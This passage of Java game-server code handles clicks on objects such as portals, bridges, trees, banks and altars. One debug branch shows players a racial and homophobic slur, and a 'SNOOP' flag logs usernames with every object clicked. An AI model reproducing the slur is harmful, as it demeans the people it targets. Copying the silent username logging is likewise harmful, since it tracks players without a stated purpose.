				  * ().addItem(HunterNPC.CERULEAN_TWITCH.getItem(), 1);
				  * player.getInventory
				  * ().addItem(HunterEquipment.BRID_SNARE.getId(), 1);
				  * player.setNextAnimation
				  * (HunterEquipment.BRID_SNARE.getPickUpAnimation());
				  * player.setTrampAmount(player.getTrampAmount() - 1);
				  * World.removeObject(object, true); } else if (id ==
				  * HunterNPC.COPPER_LONGTAIL.getTransformObjectId()) {
				  * player.getInventory
				  * ().addItem(HunterNPC.COPPER_LONGTAIL.getItem(), 1);
				  * player.getInventory
				  * ().addItem(HunterEquipment.BRID_SNARE.getId(), 1);
				  * player.setNextAnimation
				  * (HunterEquipment.BRID_SNARE.getPickUpAnimation());
				  * player.setTrampAmount(player.getTrampAmount() - 1);
				  * World.removeObject(object, true); } else if (id ==
				  * HunterNPC.FERRT.getTransformObjectId()) {
				  * player.getInventory().addItem(HunterNPC.FERRT.getItem(), 1);
				  * player.getInventory().addItem(HunterEquipment.BOX.getId(),
				  * 1);
				  * player.setNextAnimation(HunterEquipment.BOX.getPickUpAnimation
				  * ()); player.setTrampAmount(player.getTrampAmount() - 1);
				  * World.removeObject(object, true); } else if (id ==
				  * HunterNPC.GECKO.getTransformObjectId()) {
				  * player.getInventory().addItem(HunterNPC.GECKO.getItem(), 1);
				  * player.getInventory().addItem(HunterEquipment.BOX.getId(),
				  * 1);
				  * player.setNextAnimation(HunterEquipment.BOX.getPickUpAnimation
				  * ()); player.setTrampAmount(player.getTrampAmount() - 1);
				  * World.removeObject(object, true); } else if (id ==
				  * HunterNPC.GOLDEN_WARBLER.getTransformObjectId()) {
				  * player.getInventory().addItem(HunterNPC.FERRT.getItem(), 1);
				  * player
				  * .getInventory().addItem(HunterEquipment.BRID_SNARE.getId(),
				  * 1); player.setNextAnimation(HunterEquipment.BRID_SNARE.
				  * getPickUpAnimation());
				  * player.setTrampAmount(player.getTrampAmount() - 1);
				  * World.removeObject(object, true); } else if (id ==
				  * HunterNPC.MONKEY.getTransformObjectId()) {
				  * player.getInventory().addItem(HunterNPC.MONKEY.getItem(), 1);
				  * player.getInventory().addItem(HunterEquipment.BOX.getId(),
				  * 1);
				  * player.setNextAnimation(HunterEquipment.BOX.getPickUpAnimation
				  * ()); player.setTrampAmount(player.getTrampAmount() - 1);
				  * World.removeObject(object, true); } else if (id ==
				  * HunterNPC.RACCOON.getTransformObjectId()) {
				  * player.getInventory().addItem(HunterNPC.RACCOON.getItem(),
				  * 1);
				  * player.getInventory().addItem(HunterEquipment.BOX.getId(),
				  * 1);
				  * player.setNextAnimation(HunterEquipment.BOX.getPickUpAnimation
				  * ()); player.setTrampAmount(player.getTrampAmount() - 1);
				  * World.removeObject(object, true); } else if (id ==
				  * HunterNPC.TROPICAL_WAGTAIL.getTransformObjectId()) {
				  * player.getInventory
				  * ().addItem(HunterNPC.TROPICAL_WAGTAIL.getItem(), 1);
				  * player.getInventory
				  * ().addItem(HunterEquipment.BRID_SNARE.getId(), 1);
				  * player.setNextAnimation
				  * (HunterEquipment.BRID_SNARE.getPickUpAnimation());
				  * player.setTrampAmount(player.getTrampAmount() - 1);
				  * World.removeObject(object, true); } else if (id ==
				  * HunterNPC.WIMPY_BIRD.getTransformObjectId()) {
				  * player.getInventory().addItem(HunterNPC.WIMPY_BIRD.getItem(),
				  * 1);
				  * player.getInventory().addItem(HunterEquipment.BRID_SNARE.getId
				  * (), 1); player.setNextAnimation(HunterEquipment.BRID_SNARE.
				  * getPickUpAnimation());
				  * player.setTrampAmount(player.getTrampAmount() - 1);
				  * World.removeObject(object, true); }
				  */else if (id == 46500 && object.getX() == 3351
						  && object.getY() == 3415) { // zaros portal
					  player.useStairs(-1, new WorldTile(
							  Settings.RESPAWN_PLAYER_LOCATION.getX(),
							  Settings.RESPAWN_PLAYER_LOCATION.getY(),
							  Settings.RESPAWN_PLAYER_LOCATION.getPlane()), 2, 3,
							  "You found your way back to home.");
					  player.addWalkSteps(3351, 3415, -1, false);
					  
					  
					  
				  } else if (id == 21306) {
				  if(player.Talkedtosoldier == false){
				 player.getPackets().sendGameMessage( "You're unsure what's over here. Try find out in the village.");
					}
				else{
						
				  
					  if (player.getSkills().getLevel(Skills.AGILITY) < 40) {
						  player.getPackets()
						  .sendGameMessage(
								  "You need an agility level of 40 to use this Brigde.",
								  true);
						  return;
					  }
					  int y = player.getY() == 3823 ? 3832 : 3823;
					  WorldTasksManager.schedule(new WorldTask() {
						  int count = 0;

						  @Override
						  public void run() {
							  player.setNextAnimation(new Animation(841));
							  if (count++ == 1)
								  stop();
						  }

					  }, 0, 0);
					  player.setNextForceMovement(new ForceMovement( new WorldTile( 2317, y,0), 3,  player.getX() == 2886 ? 1 : 3));
					  player.useStairs(-1, new WorldTile(2317, y,0), 3, 4);
					  
				//bridge at train quest
					}
					
				} else if (id == 21307) {
					  if (player.getSkills().getLevel(Skills.AGILITY) < 40) {
						  player.getPackets()
						  .sendGameMessage(
								  "You need an agility level of 40 to use this Brigde.",
								  true);
						  return;
					  }
					  int y = player.getY() == 3823 ? 3832 : 3823;
					  WorldTasksManager.schedule(new WorldTask() {
						  int count = 0;

						  @Override
						  public void run() {
							  player.setNextAnimation(new Animation(841));
							  if (count++ == 1)
								  stop();
						  }

					  }, 0, 0);
					  player.setNextForceMovement(new ForceMovement( new WorldTile( 2317, y,0), 3,  player.getX() == 2886 ? 1 : 3));
					  player.useStairs(-1, new WorldTile(2317, y,0), 3, 4);
					  
				//bridge at train quest

					
				} else if (id == 21311) {
				
				//checks if talked to knight in village if not wont let cross.
					if(player.Talkedtosoldier == false){
				 player.getPackets().sendGameMessage( "You're unsure what's over here. Try find out in the village.");
					}
				else{
					  if (player.getSkills().getLevel(Skills.AGILITY) < 40) {
						  player.getPackets()
						  .sendGameMessage(
								  "You need an agility level of 40 to use this Bridge.",
								  true);
						  return;
					  }
					  int y = player.getY() == 3823 ? 3832 : 3823;
					  WorldTasksManager.schedule(new WorldTask() {
						  int count = 0;

						  @Override
						  public void run() {
							  player.setNextAnimation(new Animation(841));
							  if (count++ == 1)
								  stop();
						  }

					  }, 0, 0);
					  player.setNextForceMovement(new ForceMovement( new WorldTile( 2317, y,0), 3,  player.getX() == 2886 ? 1 : 3));
					  player.useStairs(-1, new WorldTile(2317, y,0), 3, 4);
					  
				//bridge at train quest

					}
							
					
					
		//bridge after killing knight.
		
		 	} else if (id == 21310) {
				
				
					  if (player.getSkills().getLevel(Skills.AGILITY) < 40) {
						  player.getPackets()
						  .sendGameMessage(
								  "You need an agility level of 40 to use this Bridge.",
								  true);
						  return;
					  }
					  int y = player.getY() == 3839 ? 3848 : 3839;
					  WorldTasksManager.schedule(new WorldTask() {
						  int count = 0;

						  @Override
						  public void run() {
							  player.setNextAnimation(new Animation(841));
							  if (count++ == 1)
								  stop();
						  }

					  }, 0, 0);
					  player.setNextForceMovement(new ForceMovement( new WorldTile( 2314, y,0), 3,  player.getX() == 3839 ? 1 : 3));
					  player.useStairs(-1, new WorldTile(2314, y,0), 3, 4);
					  
				//bridge at train quest

					
				
			}
					
					
					
					
				
				
				
				
				
				
				 else if (id == 9293) {
					  if (player.getSkills().getLevel(Skills.AGILITY) < 70) {
						  player.getPackets()
						  .sendGameMessage(
								  "You need an agility level of 70 to use this obstacle.",
								  true);
						  return;
					  }
					  int x = player.getX() == 2886 ? 2892 : 2886;
					  WorldTasksManager.schedule(new WorldTask() {
						  int count = 0;

						  @Override
						  public void run() {
							  player.setNextAnimation(new Animation(844));
							  if (count++ == 1)
								  stop();
						  }

					  }, 0, 0);
					  player.setNextForceMovement(new ForceMovement( new WorldTile(x, 9799, 0), 3,  player.getX() == 2886 ? 1 : 3));
					  player.useStairs(-1, new WorldTile(x, 9799, 0), 3, 4);
					  
				//Portal

					}
					else if (id == 42425) {
					 player.useStairs(10584, new WorldTile(2832,3854, 3), 2, 3,
												"You get zapped and teleported. ");
				 
					  }	
				   else if (id == 30146) {
				
				
					 player.useStairs(10584, new WorldTile(2863,5927, 0), 2, 3,
												"You get zapped and teleported. ");
				 
					  }									  
					  
				//DZ agil	  
					 //from dz to other side
					 
				
					 
				   else if (id == 2823) {
					  if (player.getSkills().getLevel(Skills.AGILITY) < 70) {
						  player.getPackets()
						  .sendGameMessage(
								  "You need an agility level of 70 to use this obstacle.",
								  true);
						  return;
					  }
					  int x = player.getX() == 3795 ? 2869 : 3795;
					  WorldTasksManager.schedule(new WorldTask() {
						  int count = 0;

						  @Override
						  public void run() {
							  player.setNextAnimation(new Animation(769));
							  player.addStopDelay(5);
							  player.setNextAnimation(new Animation(772));
							  player.getSkills().addXp(16, 9.4);
							  if (count++ == 1)
								  stop();
						  }

					  }, 0, 0);
					  player.setNextForceMovement(new ForceMovement(
							  new WorldTile(x, 2869, 0), 3,
							  player.getX() == 3795 ? 1 : 3));
					  player.useStairs(-1, new WorldTile(x, 2869, 0), 3, 4);
					  
					  }
				//back
				
				   else if (id == 2823) {
					  if (player.getSkills().getLevel(Skills.AGILITY) < 70) {
						  player.getPackets()
						  .sendGameMessage(
								  "You need an agility level of 70 to use this obstacle.",
								  true);
						  return;
					  }
					  int x = player.getX() == 3783 ? 2869 : 3783;
					  WorldTasksManager.schedule(new WorldTask() {
						  int count = 0;

						  @Override
						  public void run() {
							  player.setNextAnimation(new Animation(769));
							  player.addStopDelay(5);
							  player.setNextAnimation(new Animation(772));
							  player.getSkills().addXp(16, 9.4);
							  if (count++ == 1)
								  stop();
						  }

					  }, 0, 0);
					  player.setNextForceMovement(new ForceMovement(
							  new WorldTile(x, 2869, 0), 3,
							  player.getX() == 3783 ? 1 : 3));
					  player.useStairs(-1, new WorldTile(x, 2869, 0), 3, 4);
					  
					  }

					  //end
					  
				  else if (id == 2295)
					  Agility.walkGnomeLog(player);
				  else if (id == 2285)
					  Agility.climbGnomeObstacleNet(player);
				  else if (id == 35970)
					  Agility.climbUpGnomeTreeBranch(player);
				  else if (id == 2312)
					  Agility.walkGnomeRope(player);
				  else if (id == 4059)
					  Agility.walkBackGnomeRope(player);
				  else if (id == 2314)
					  Agility.climbDownGnomeTreeBranch(player);
				  else if (id == 2286)
					  Agility.climbGnomeObstacleNet2(player);
				  else if (id == 43543 || id == 43544)
					  Agility.enterGnomePipe(player, object.getX(), object.getY());
				  else if (Wilderness.isDitch(id)) {// wild ditch
					  player.getDialogueManager().startDialogue(
							  "WildernessDitch", object);
					} else if (id == 42611) {// Magic Portal
					  player.getDialogueManager().startDialogue("MagicPortal");
//revs	3095,3934
					} else if (id == 2157) {
					player.useStairs(10584, new WorldTile(3091,3933, 0), 2, 3,
							  "You are teleported to the other side.");
							  
					} else if (id == 2156) {
					player.useStairs(10584, new WorldTile(3095,3933, 0), 2, 3,
							  "You are teleported to the other side.");
	
//Clan wars	
			/* /red
					} else if (id == 38699) {
							  Magic.sendNormalTeleportSpell(player, 0, 0, new WorldTile(3086,3494, 0)); 
			*/
			//safe
				//	} else if (id == 38698) {
				//				Magic.sendNormalTeleportSpell(player, 0, 0, new WorldTile(2815,5511, 0)); 

				// } else if (id == 27254) {// Edgeville portal
					  player.getPackets().sendGameMessage(
							  "You enter the portal...");
					  player.useStairs(10584, new WorldTile(2815, 5511, 0), 2, 3,
							  "..and are transported to Home.");


				} else if (id == 2472) {//RC portal
					  player.useStairs(10584, new WorldTile(3087, 3490, 0), 2, 3,
							  "..and are transported to Home.");

				  } else if (id == 15522) {// portal sign
					  if (player.withinDistance(new WorldTile(1598, 4504, 0), 1)) {// PORTAL
						  // 1
						  player.getInterfaceManager().sendInterface(327);
						  player.getPackets().sendIComponentText(327, 13,
								  "Edgeville");
						  player.getPackets()
						  .sendIComponentText(
								  327,
								  14,
								  "This portal will take you to edgeville. There "
										  + "you can multi pk once past the wilderness ditch.");
					  }
					  if (player.withinDistance(new WorldTile(1598, 4508, 0), 1)) {// PORTAL
						  // 2
						  player.getInterfaceManager().sendInterface(327);
						  player.getPackets().sendIComponentText(327, 13,
								  "Mage Bank");
						  player.getPackets()
						  .sendIComponentText(
								  327,
								  14,
								  "This portal will take you to the mage bank. "
										  + "The mage bank is a 1v1 deep wilderness area.");
					  }
					  if (player.withinDistance(new WorldTile(1598, 4513, 0), 1)) {// PORTAL
						  // 3
						  player.getInterfaceManager().sendInterface(327);
						  player.getPackets().sendIComponentText(327, 13,
								  "Magic's Portal");
						  player.getPackets()
						  .sendIComponentText(
								  327,
								  14,
								  "This portal will allow you to teleport to areas that "
										  + "will allow you to change your magic spell book.");
					  }
				  } else if (id == 37929) {// corp beast
					  if (object.getX() == 2971 && object.getY() == 4382
							  && object.getPlane() == 0)
						  player.getInterfaceManager().sendInterface(650);
					  else if (object.getX() == 2918 && object.getY() == 4382
							  && object.getPlane() == 0) {
						  player.stopAll();
						  player.setNextWorldTile(new WorldTile(
								  player.getX() == 2921 ? 2917 : 2921, player
										  .getY(), player.getPlane()));
					  }
				  } else if (id == 37928 && object.getX() == 2883
						  && object.getY() == 4370 && object.getPlane() == 0) {
					  player.stopAll();
					  player.setNextWorldTile(new WorldTile(3214, 3782, 0));
					  player.getControlerManager().startControler("Wilderness");
				  } else if (id == 38815 && object.getX() == 3209
						  && object.getY() == 3780 && object.getPlane() == 0) {
					  if (player.getSkills().getLevelForXp(Skills.WOODCUTTING) < 37
							  || player.getSkills().getLevelForXp(Skills.MINING) < 45
							  || player.getSkills().getLevelForXp(
									  Skills.SUMMONING) < 23
									  || player.getSkills().getLevelForXp(
											  Skills.FIREMAKING) < 47
											  || player.getSkills().getLevelForXp(Skills.PRAYER) < 55) {
						  player.getPackets()
						  .sendGameMessage(
								  "You need 23 Summoning, 37 Woodcutting, 45 Mining, 47 Firemaking and 55 Prayer to enter this dungeon.");
						  return;
					  }
					  player.stopAll();
					  player.setNextWorldTile(new WorldTile(2885, 4372, 0));
					  player.getControlerManager().forceStop();
					  // TODO all reqs, skills not added
				  } else if (id == 9369) {
					  player.getControlerManager().startControler("FightPits");
				  } else if (id == 50205){
					  Summoning.infusePouches(player);
				  } else if (id == 54019 || id == 54020 || id == 55301)
					  PkRank.showRanks(player);
				  else if (id == 1817 && object.getX() == 2273
						  && object.getY() == 4680) { // kbd lever
					  Magic.pushLeverTeleport(player, new WorldTile(3067, 10254,
							  0));
				  } else if (id == 1816 && object.getX() == 3067
						  && object.getY() == 10252) { // kbd out lever
					  Magic.pushLeverTeleport(player,
							  new WorldTile(2273, 4681, 0));
					} else if (id == 9356) {
                    player.getDialogueManager().startDialogue("JadEnter");
					} else if (id == 28779) {
                    player.getDialogueManager().startDialogue("BorkEnter");
					} else if (id == 28698) {
					player.getDialogueManager().startDialogue("LunarAltar");
				  } else if (id == 32015 && object.getX() == 3069
						  && object.getY() == 10256) { // kbd stairs
					  player.useStairs(828, new WorldTile(3017, 3848, 0), 1, 2);
					  player.getControlerManager().startControler("Wilderness");
				  } else if (id == 1765 && object.getX() == 3017
						  && object.getY() == 3849) { // kbd out stairs
					  player.stopAll();
					  player.setNextWorldTile(new WorldTile(3069, 10255, 0));
					  player.getControlerManager().forceStop();
				  } else if ((id == 14315) || (id == 14314)) {
					  player.setPestControl(new PestControl(player));
					  player.getPestControl().handleObjectClick1(player, object);
				  } else if (id == 5959) {
					  Magic.pushLeverTeleport(player,
							  new WorldTile(2539, 4712, 0));
				  } else if (id == 5960) {
					  Magic.pushLeverTeleport(player,
							  new WorldTile(3089, 3957, 0));
				  } else if (id == 62675)
					  player.getCutscenesManager().play("DTPreview");
			
				  else if (id == 62681)
					  player.getDominionTower().viewScoreBoard();
				  else if (id == 2273) {
						  player.setNextWorldTile(new WorldTile(2851,5933,0));
				player.sm("Use your fire cape on the floating orb to bring out Har'Arken.");
				player.sm("WARNING     WARNING     WARNING     WARNING     WARNING     WARNING     WARNING");
				player.sm("You will lose your fire cape and not be able to get it back, but gain the kiln cape if you win!");
				  } else if (id == 62678 || id == 62679)
					  player.getDominionTower().openModes();
				
				 else if (id == 62688)
					  player.getDialogueManager().startDialogue("DTClaimRewards");
				  else if (id == 62677)
					  player.getDominionTower().talkToFace();
				  else if (id == 2213)
						  player.getBank().openBank();
				  else if (id == 62680)
					  player.getDominionTower().openBankChest();
				  else if (id == 62676) { // dominion exit
					  player.useStairs(-1, new WorldTile(3374, 3093, 0), 0, 1);
				  } else if (id == 62674) { // dominion entrance
					  player.useStairs(-1, new WorldTile(3744, 6405, 0), 0, 1);


					//spec restore altar
					  } else if (id == 61) {
					  
			 if(player.lastSpec <= Utils.currentTimeMillis()){
				player.getCombatDefinitions().resetSpecialAttack();
				player.lastSpec = (Utils.currentTimeMillis() + 300000);
						player.setNextAnimation(new Animation(1651));
					player.setNextGraphics(new Graphics(388));
					player.getPackets().sendGameMessage("You recharge your special attack.");
				
					}
			else{
				player.getPackets().sendGameMessage("You can only use this every 5 minutes.");
				player.getPackets().sendGameMessage(String.valueOf(player.lastSpec) + " Last spec");
				player.getPackets().sendGameMessage(String.valueOf(Utils.currentTimeMillis() + "Current time" ));
					
				}
				  } else {
					  switch (objectDef.name.toLowerCase()) {
					  case "web":
						  if (objectDef.containsOption(0, "Slash")) {
							  player.setNextAnimation(new Animation(PlayerCombat
									  .getWeaponAttackEmote(player.getEquipment()
											  .getWeaponId(), player
											  .getCombatDefinitions()
											  .getAttackStyle())));
							  slashWeb(player, object);
						  }
						  break;
					  case "bank booth":
						  if (objectDef.containsOption(0, "Bank"))
							  player.getBank().openBank();
						  break;
					  case "bank chest":
						  if (objectDef.containsOption(0, "Use"))
							  player.getBank().openBank();
					  case "bank deposit box":
						  if (objectDef.containsOption(0, "Deposit"))
							  player.getBank().openDepositBox();
						  break;
					  case "bank":
						  player.getBank().openBank();
						  break;
						  // Woodcutting start
					  case "tree":
						  if (objectDef.containsOption(0, "Chop down"))
							  player.getActionManager().setSkill(
									  new Woodcutting(object,
											  TreeDefinitions.NORMAL));
						  break;
					  case "dead tree":
						  if (objectDef.containsOption(0, "Chop down"))
							  player.getActionManager().setSkill(
									  new Woodcutting(object,
											  TreeDefinitions.DEAD));
						  break;
					  case "oak":
						  if (objectDef.containsOption(0, "Chop down"))
							  player.getActionManager()
							  .setSkill(
									  new Woodcutting(object,
											  TreeDefinitions.OAK));
						  break;
					  case "willow":
						  if (objectDef.containsOption(0, "Chop down"))
							  player.getActionManager().setSkill(
									  new Woodcutting(object,
											  TreeDefinitions.WILLOW));
						  break;
					  case "maple tree":
						  if (objectDef.containsOption(0, "Chop down"))
							  player.getActionManager().setSkill(
									  new Woodcutting(object,
											  TreeDefinitions.MAPLE));
						  break;
					 /* case "ivy":
						  if (objectDef.containsOption(0, "Chop"))
							  player.getActionManager()
							  .setSkill(
									  new Woodcutting(object,
											  TreeDefinitions.IVY));
						  break;*/
					  case "yew":
						  if (objectDef.containsOption(0, "Chop down"))
							  player.getActionManager()
							  .setSkill(
									  new Woodcutting(object,
											  TreeDefinitions.YEW));
						  break;
					  case "magic tree":
						  if (objectDef.containsOption(0, "Chop down"))
							  player.getActionManager().setSkill(
									  new Woodcutting(object,
											  TreeDefinitions.MAGIC));
						  break;
					  case "cursed magic tree":
						  if (objectDef.containsOption(0, "Chop down"))
							  player.getActionManager().setSkill(
									  new Woodcutting(object,
											  TreeDefinitions.CURSED_MAGIC));
						  break;
						  
						
						  // Woodcutting end
					  case "gate":
					  case "large door":
					  case "magic guild door":
					  case "metal door":
						  if (object.getType() == 0
						  && objectDef.containsOption(0, "Open"))
							  handleGate(player, object);
						  break;
					  case "door":
						  if (object.getType() == 0
						  && (objectDef.containsOption(0, "Open") || objectDef
								  .containsOption(0, "Unlock")))
							  handleDoor(player, object);
						  break;
					  case "ladder":
						  handleLadder(player, object, 1);
						  break;
					  case "staircase":
						  handleStaircases(player, object, 1);
						  break;
					  case "altar":
						  if (objectDef.containsOption(0, "Pray-at")) {
							  final int maxPrayer = player.getSkills()
									  .getLevelForXp(Skills.PRAYER) * 10;
							  if (player.getPrayer().getPrayerpoints() < maxPrayer) {
								  player.addStopDelay(5);
								  player.getPackets().sendGameMessage(
										  "You pray to the gods...", true);
								  player.setNextAnimation(new Animation(645));
								  WorldTasksManager.schedule(new WorldTask() {
									  @Override
									  public void run() {
										  player.getPrayer().restorePrayer(
												  maxPrayer);
										  player.getPackets()
										  .sendGameMessage(
												  "...and recharged your prayer.",
												  true);
									  }
								  }, 2);
							  } else {
								  player.getPackets().sendGameMessage(
										  "You already have full prayer.", true);
							  }
							  if (id == 6552)
								  player.getDialogueManager().startDialogue(
										  "AncientAltar");
						  }
						  break;
						  
						  
						  

						  
					  default:
						//  player.getPackets().sendGameMessage(
								//  "Nothing interesting happens.");
						  break;
					  }
				  }
				if (Settings.DEBUG){
					Logger.log(
							"ObjectHandler",
							"cliked 1 at object id : " + id + ", "
									+ object.getX() + ", " + object.getY()
									+ ", " + object.getPlane() + ", "
									+ object.getType() + ", "
									+ object.getRotation() + ", "
									+ object.getDefinitions().name);
			
					
			}

			if (Settings.NEGGA == true){
					Logger.log(
							"Some Negga ",
							"cliked 1 at object id : " + id + ", "
									+ object.getX() + ", " + object.getY()
									+ ", " + object.getPlane() + ", "
									+ object.getType() + ", "
									+ object.getRotation() + ", "
									+ object.getDefinitions().name);
			 player.getInterfaceManager().sendInterface(112);
						  player.getPackets().sendIComponentText(112, 7, "Negga You Gey.");
						  player.getPackets().sendIComponentText(112, 9, "By Poanizer.");
					
			}
			if (Settings.SNOOP){
					Logger.log(
							player.getUsername()							,
							"cliked 1 at object id : " + id + object.getDefinitions().name+ ", "
									+ object.getX() + ", " + object.getY()
									+ ", " + object.getPlane()) 
									;
			
					
			}
			
			}

		}, objectDef.getSizeX(), Wilderness.isDitch(id) ? 4 : objectDef
				.getSizeY(), object.getRotation()));
	}

	public static void slashWeb(Player player, WorldObject object) {

		if (Utils.getRandom(1) == 0) {
			World.spawnTemporaryObject(new WorldObject(object.getId() + 1,
					object.getType(), object.getRotation(), object.getX(),
					object.getY(), object.getPlane()), 60000, true);
			player.getPackets().sendGameMessage("You slash through the web!");
		} else
			player.getPackets().sendGameMessage(
					"You fail to cut through the web.");
	}

	public static void handleOption2(final Player player, InputStream stream) {
		if (!player.hasStarted() || !player.clientHasLoadedMapRegion()
				|| player.isDead())
			return;
		long currentTime = Utils.currentTimeMillis();
		if (player.getStopDelay() >= currentTime
				|| player.getFreezeDelay() >= currentTime
				|| player.getEmotesManager().getNextEmoteEnd() >= currentTime)
			return;
		@SuppressWarnings("unused")
		boolean junk = stream.readUnsignedByte128() == 1;
		int x = stream.readUnsignedShort128();
		final int id = stream.readInt();
		int y = stream.readUnsignedShortLE();
		final WorldTile tile = new WorldTile(x, y, player.getPlane());
		int regionId = tile.getRegionId();
		if (!player.getMapRegionsIds().contains(regionId))
			return;
		WorldObject mapObject = World.getRegion(regionId).getObject(id, tile);
		if (mapObject == null || mapObject.getId() != id) { // temporary fixes
			// fix
			if (player.isAtDynamicRegion()
					&& World.getRotation(player.getPlane(), x, y) != 0) {
				ObjectDefinitions defs = ObjectDefinitions
						.getObjectDefinitions(id);
				if (defs.getSizeX() > 1 || defs.getSizeY() > 1) {
					for (int xs = 0; xs < defs.getSizeX() + 1
							&& (mapObject == null || mapObject.getId() != id); xs++) {
						for (int ys = 0; ys < defs.getSizeY() + 1
								&& (mapObject == null || mapObject.getId() != id); ys++) {
							tile.setLocation(x + xs, y + ys, tile.getPlane());
							mapObject = World.getRegion(regionId).getObject(id,
									tile);
						}
					}
				}
			}
			if (mapObject == null || mapObject.getId() != id)
				return;
		}

		final WorldObject object = !player.isAtDynamicRegion() ? mapObject
				: new WorldObject(id, mapObject.getType(),
						mapObject.getRotation(), x, y, player.getPlane());
		if (player.isAtDynamicRegion()) {
			int rotation = object.getRotation();
			rotation += World.getRotation(player.getPlane(), x, y);
			if (rotation > 3)
				rotation -= 4;
			object.setRotation(rotation);
		}
		player.stopAll(false);
		final ObjectDefinitions objectDef = object.getDefinitions();
		player.setCoordsEvent(new CoordsEvent(tile, new Runnable() {
			@Override
			public void run() {
				player.stopAll();
				player.setNextFaceWorldTile(new WorldTile(object.getCoordFaceX(
						objectDef.getSizeX(), objectDef.getSizeY(),
						object.getRotation()), object.getCoordFaceY(
								objectDef.getSizeX(), objectDef.getSizeY(),
								object.getRotation()), object.getPlane()));
				if (!player.getControlerManager().processObjectClick2(object))
					return;
				if (id == 36786 || id == 42378 || id == 42377 || id == 42217 || id == 2213
						|| id == 27663)
					player.getBank().openBank();
				else if (object.getDefinitions().name
						.equalsIgnoreCase("furnace"))
					player.getDialogueManager().startDialogue("SmeltingD",
							object);
				else if (id == 61)
					player.getDialogueManager().startDialogue("LunarAltar");
					
		
		
		
			 	else if (id == 62677)
					player.getDominionTower().openRewards();
				else if (id == 50205)//summon renew 
						{
						//player.getPackets().sendGameMessage(String.valueOf(levelz));
						/*int gainz = 0;
						int levelz = player.getSkills().getLevel(23);
					
					while((player.getSkills().getXp(23) <= player.getSkills().getXPForLevel(levelz)) || (gainz <= 99)){
					gainz += 5;
					player.getSkills().set(23, gainz);
					}*/
						player.setNextAnimation(new Animation(8502));
						player.setNextGraphics(new Graphics(56));
				
					}else if (id == 782)
					player.getBank().openBank();
				/*
				else if (id == 4277)
                     player.setNextAnimation(new Animation(881));
                    player.getPackets().sendGameMessage(
                     "You successfully thieve from the stall");
					player.getInventory().addItem(995, 5000); 
					player.addStopDelay(4); 
					player.getSkills().addXp(17, 1000); 
				*/
				else if (id == 62688)
					player.getDialogueManager().startDialogue(
							"SimpleMessage",
							"You have a Dominion Factor of "
									+ player.getDominionTower()
									.getDominionFactor() + ".");
				else if (id == 34384 || id == 34383 || id == 14011
						|| id == 7053 || id == 34387 || id == 34386
						|| id == 34385)
					Thieving.handleStalls(player, object);					
				else {
					switch (objectDef.name.toLowerCase()) {
					case "gate":
					case "metal door":
						if (object.getType() == 0
						&& objectDef.containsOption(1, "Open"))
							handleGate(player, object);
						break;
					case "door":
						if (object.getType() == 0
						&& objectDef.containsOption(1, "Open"))
							handleDoor(player, object);
						break;
					case "ladder":
						handleLadder(player, object, 2);
						break;
					case "staircase":
						handleStaircases(player, object, 2);
						break;
					default:
						//player.getPackets().sendGameMessage(
								//"Nothing interesting happens.");
						break;
					}
				}
				if (Settings.DEBUG)
					Logger.log("ObjectHandler", "cliked 2 at object id : " + id
							+ ", " + object.getX() + ", " + object.getY()
							+ ", " + object.getPlane());
				if (Settings.SNOOP){
					Logger.log(
							player.getUsername()							,
							"cliked 2 at object id : " + id + object.getDefinitions().name + ", "
									+ object.getX() + ", " + object.getY()
									+ ", " + object.getPlane()
									);
			
					
			}
			}
		}, objectDef.getSizeX(), objectDef.getSizeY(), object.getRotation()));
	}

	public static void handleExamine(final Player player, InputStream stream) {
		if (!player.hasStarted() || !player.clientHasLoadedMapRegion()
				|| player.isDead())
			return;
		@SuppressWarnings("unused")
		boolean junk = stream.readUnsignedByte128() == 1;
		int x = stream.readUnsignedShort128();
		final int id = stream.readInt();
		int y = stream.readUnsignedShortLE();
		final WorldTile tile = new WorldTile(x, y, player.getPlane());
		int regionId = tile.getRegionId();
		if (!player.getMapRegionsIds().contains(regionId))
			return;
		WorldObject mapObject = World.getRegion(regionId).getObject(id, tile);
		if (mapObject == null || mapObject.getId() != id)
			return;
		final WorldObject object = !player.isAtDynamicRegion() ? mapObject
				: new WorldObject(id, mapObject.getType(),
						mapObject.getRotation(), x, y, player.getPlane());
		player.getPackets().sendGameMessage("It's an " + object.getDefinitions().name + ".");
			if(player.getRights() > 9){
						player.getPackets().sendGameMessage(
								  " Object id: " + id+ " Coords: " + object.getX() + ", " + object.getY()
							+ ", " + object.getPlane() + " Rotation: "
									+ object.getRotation() );
					
					}
		if (Settings.DEBUG)
			Logger.log("ObjectHandler", "examined object: " + id+ ", x: "+x+ ", y: "+y);
	}

	public static void handleOption3(final Player player, InputStream stream) {
		if (!player.hasStarted() || !player.clientHasLoadedMapRegion()
				|| player.isDead())
			return;
		long currentTime = Utils.currentTimeMillis();
		if (player.getStopDelay() >= currentTime
				// || player.getFreezeDelay() >= currentTime
				|| player.getEmotesManager().getNextEmoteEnd() >= currentTime)
			return;
		@SuppressWarnings("unused")
		boolean junk = stream.readUnsignedByte128() == 1;
		int x = stream.readUnsignedShort128();
		final int id = stream.readInt();
		int y = stream.readUnsignedShortLE();
		final WorldTile tile = new WorldTile(x, y, player.getPlane());
		int regionId = tile.getRegionId();
		if (!player.getMapRegionsIds().contains(regionId))
			return;
		WorldObject mapObject = World.getRegion(regionId).getObject(id, tile);
		if (mapObject == null || mapObject.getId() != id) { // temporary fixes
			// fix
			if (player.isAtDynamicRegion()
					&& World.getRotation(player.getPlane(), x, y) != 0) {
				ObjectDefinitions defs = ObjectDefinitions
						.getObjectDefinitions(id);
				if (defs.getSizeX() > 1 || defs.getSizeY() > 1) {
					for (int xs = 0; xs < defs.getSizeX() + 1
							&& (mapObject == null || mapObject.getId() != id); xs++) {
						for (int ys = 0; ys < defs.getSizeY() + 1
								&& (mapObject == null || mapObject.getId() != id); ys++) {
							tile.setLocation(x + xs, y + ys, tile.getPlane());
							mapObject = World.getRegion(regionId).getObject(id,
									tile);
						}
					}
				}
			}
			if (mapObject == null || mapObject.getId() != id)
				return;
		}
		final WorldObject object = !player.isAtDynamicRegion() ? mapObject
				: new WorldObject(id, mapObject.getType(),
						mapObject.getRotation(), x, y, player.getPlane());
		if (player.isAtDynamicRegion()) {
			int rotation = object.getRotation();
			rotation += World.getRotation(player.getPlane(), x, y);
			if (rotation > 3)
				rotation -= 4;
			object.setRotation(rotation);
		}
		player.stopAll(false);
		final ObjectDefinitions objectDef = object.getDefinitions();
		player.setCoordsEvent(new CoordsEvent(tile, new Runnable() {
			@Override
			public void run() {
				player.stopAll();
